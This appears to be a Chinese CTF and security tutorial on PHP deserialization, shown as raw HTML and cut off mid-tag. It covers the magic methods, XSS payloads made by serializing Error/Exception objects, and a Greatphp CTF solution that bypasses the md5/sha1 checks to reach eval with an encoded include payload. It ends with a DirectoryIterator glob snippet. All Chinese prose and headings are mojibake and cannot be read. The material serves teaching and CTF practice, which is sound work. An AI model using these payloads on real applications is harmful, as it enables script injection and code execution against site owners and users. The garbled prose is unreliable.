class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212220422.png\" alt=\"image-20221031212220422\" /></p>\n<h3 id=\"__wakeupååºåˆ—åŒ–çš„ä¼˜å…ˆè°ƒç”¨\"><a class=\"anchor\" href=\"#__wakeupååºåˆ—åŒ–çš„ä¼˜å…ˆè°ƒç”¨\">#</a> __wakeup ()ï¼Œååºåˆ—åŒ–çš„ä¼˜å…ˆè°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">&lt;?php\nerror_reporting(0);\nclass demo&#123;\n    public $clown&#x3D;&quot;joker&quot;;\n    private $test &#x3D; &quot;test&quot;;\n    function __sleep()&#123;\n        echo &quot;sleeping\\n&quot;;\n        return array(&quot;clown&quot;);\n    &#125;\n    function __wakeup()&#123;\n        echo &quot;waking up\\n&quot;;\n    &#125;\n&#125;\n$a&#x3D;new demo();\n$B&#x3D;serialize($a);\nunserialize($B);<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212435068.png\" alt=\"image-20221031212435068\" /></p>\n<h3 id=\"__tostringç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨\"><a class=\"anchor\" href=\"#__tostringç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨\">#</a> __toString ()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶è‡ªåŠ¨è°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'toString'</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212708429.png\" alt=\"image-20221031212708429\" /></p>\n<h3 id=\"__invokeå½“ç±»è¢«å½“ä½œæ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨\"><a class=\"anchor\" href=\"#__invokeå½“ç±»è¢«å½“ä½œæ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨\">#</a> __invoke ()ï¼Œå½“ç±»è¢«å½“ä½œæ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031212919336.png\" alt=\"image-20221031212919336\" /></p>\n<h3 id=\"__cloneè°ƒç”¨cloneå‡½æ•°å¤åˆ¶ç±»è°ƒç”¨\"><a class=\"anchor\" href=\"#__cloneè°ƒç”¨cloneå‡½æ•°å¤åˆ¶ç±»è°ƒç”¨\">#</a> __clone ()ï¼Œè°ƒç”¨ clone å‡½æ•°å¤åˆ¶ç±»è°ƒç”¨</h3>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">demo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$clown</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"joker\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"cloned\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">demo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">clone</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031213057559.png\" alt=\"image-20221031213057559\" /></p>\n<h2 id=\"phpåŸç”Ÿç±»çš„ä½¿ç”¨\"><a class=\"anchor\" href=\"#phpåŸç”Ÿç±»çš„ä½¿ç”¨\">#</a> PHP åŸç”Ÿç±»çš„ä½¿ç”¨</h2>\n<p>æ—¢ç„¶æ˜¯ååºåˆ—åŒ–æ€ä¹ˆå¯èƒ½ä¼šæ²¡æœ‰åŸç”Ÿç±»çš„èº«å½±ï¼Ÿ</p>\n<p>php åŸç”Ÿç±»ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯åœ¨æ ‡å‡† php åº“ä¸­å·²ç»å°è£…å¥½çš„ç±»ï¼Œç»å¸¸é‡è§çš„æœ‰ï¼š</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Error\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h3 id=\"errorexception-xss\"><a class=\"anchor\" href=\"#errorexception-xss\">#</a> Error/Exception --XSS</h3>\n<p>Error ç±»ç”¨äº php7 å’Œ php8 ä¸­å¼€å¯ä¿å­˜</p>\n<p>Exceotion ç±»ç”¨äº php5ã€php7 å’Œ php8 ä¸­å¼€å¯æŠ¥é”™</p>\n<h4 id=\"error\"><a class=\"anchor\" href=\"#error\">#</a> Error</h4>\n<p>Error ç±»æ˜¯ä» php7 å¼€å§‹å¼•å…¥çš„ï¼Œæ˜¯æ‰€æœ‰ php æŠ¥é”™çš„åŸºç±»ï¼Œä¸ºä»€ä¹ˆä¼šå’Œ xss æ‰¯ä¸Šå…³ç³»å‘¢ï¼Ÿxss å¸¸è§çš„æ¼æ´ç‚¹åœ¨æœ‰è¾“å‡ºçš„åœ°æ–¹ï¼Œè€Œåœ¨ Error ç±»ä¸­æœ‰ä¸€ä¸ª__toString () é­”æœ¯æ–¹æ³•ï¼Œå½“æˆ‘ä»¬æŠŠå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨è°ƒç”¨ï¼ˆdemo å¯ä»¥çœ‹çœ‹ä¸Šé¢ï¼‰ï¼Œå¦‚æœè¿™é‡Œæœ‰ä¸ª echo å°±å¯ä»¥è§¦å‘ toString å°†å¼‚å¸¸å¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pop'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>payloadï¼š</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert(/xss/)&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%2Fxss%2F%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22C%3A%5CUsers%5C%E9%99%8C%E8%B7%AF%5CDesktop%5Cindex+%281%29.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A3%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031223216347.png\" alt=\"image-20221031223216347\" /></p>\n<h4 id=\"exception\"><a class=\"anchor\" href=\"#exception\">#</a> Exception</h4>\n<p>è¿™é‡Œåˆ©ç”¨æ–¹å¼ä¸€æ ·ï¼Œé€‚åº”çš„ php ç‰ˆæœ¬æ›´å¹¿</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert(/xss/)&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payloadï¼š</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;script>alert(1)&lt;/script>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22C%3A%5CUsers%5C%E9%99%8C%E8%B7%AF%5CDesktop%5Cindex+%281%29.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221031224036762.png\" alt=\"image-20221031224036762\" /></p>\n<h3 id=\"errorexception-ç»•è¿‡å“ˆå¸Œ\"><a class=\"anchor\" href=\"#errorexception-ç»•è¿‡å“ˆå¸Œ\">#</a> Error/Exception -- ç»•è¿‡å“ˆå¸Œ</h3>\n<p>è¿™é‡Œå°±å¾—æåˆ°è¿™ä¸¤ä¸ªåŸç”Ÿç±»çš„å±æ€§</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">message-é”™è¯¯çš„æ¶ˆæ¯å†…å®¹\ncode-é”™è¯¯ä»£ç \nfile-æŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å\nline-æŠ›å‡ºé”™è¯¯çš„è¡Œæ•°<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"test\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token operator\">===</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/*\nbool (false)\nError: test in C:\\Users\\ é™Œè·¯ \\Desktop\\sheng.php:2\nStack trace:\n#0 &#123;main&#125;\nError: test in C:\\Users\\ é™Œè·¯ \\Desktop\\sheng.php:2\nStack trace:\n#0 &#123;main&#125;\n*/</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œ<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>a</mi><mtext>å’Œ</mtext></mrow><annotation encoding=\"application/x-tex\">aå’Œ</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">å’Œ</span></span></span></span> b ä¸åŒä½†æ˜¯ï¼ŒtoString è¿”å›ç»“æœç›¸åŒ</p>\n<p>è¿™å°±ä¸å¾—ä¸æåˆ°ä¸€é“ç»å…¸çš„ä¾‹é¢˜</p>\n<p>[2020 æå®¢å¤§æŒ‘æˆ˜] Greatphp</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SYCLOVER</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$syc</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$lover</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n           <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\&lt;\\?php|\\(|\\)|\\\"|\\'/\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Try Hard !!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'great'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'great'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>payloadï¼š</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">SYCLOVER</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$syc</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$lover</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$payload</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"?>&lt;?=include~\"</span><span class=\"token operator\">.</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%d0%99%93%9e%98\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"?>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/*\næˆ–ä½¿ç”¨ [~(å–å)][!% FF] çš„å½¢å¼ï¼Œ\nå³: $payload = \"?>&lt;?=include [~\".urldecode (\"% D0%99%93%9E%98\").\"][!.urldecode (\"% FF\").\"]?>\";    \n\n$payload = \"?>&lt;?=include $_GET [_]?>\"; \n*/</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$payload</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">SYCLOVER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">syc</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$c</span><span class=\"token operator\">-></span><span class=\"token property\">lover</span><span class=\"token operator\">=</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h3 id=\"ç›®å½•éå†\"><a class=\"anchor\" href=\"#ç›®å½•éå†\">#</a> ç›®å½•éå†</h3>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">å¯éå†ç›®å½•ç±»æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š\nDirectoryIterator ç±»\nFilesystemIterator ç±»\nGlobIterator ç±»<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"directoryiterator-ç±»\"><a class=\"anchor\" href=\"#directoryiterator-ç±»\">#</a> DirectoryIterator ç±»</h4>\n<p>DirectoryIterator ç±»æä¾›äº†ä¸€ä¸ªæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ï¼Œ</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">//error_reporting(0);</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token function\">getFilename</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" 